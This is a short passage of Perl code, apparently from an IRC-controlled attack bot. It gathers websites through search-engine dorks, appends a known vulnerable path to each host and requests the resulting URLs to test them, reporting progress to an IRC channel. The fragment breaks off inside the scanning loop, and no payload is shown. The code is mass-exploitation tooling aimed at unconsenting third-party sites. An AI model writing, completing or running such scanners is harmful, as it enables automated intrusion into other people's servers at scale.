	my $bug = $_[1];
	my $simpan = $_[2];
	my $dork = $_[3];
	my $engine = $_[4];
	my $count = 0;
    my @totexploit = &search_engine($chan,$bug,$dork,$engine,$thumblogo);
	my $num = scalar(@totexploit);
	if ($num > 0){
	    foreach my $site(@totexploit){
		$count++;
		if ($count == $num-1) { &msg("$chan","$thumblogo15$engine 9Finished 15for 9$dork "); }
		    my $vuln = "http://".$site.$bug;
			my $cek  = &get_content($vuln);sleep(1);
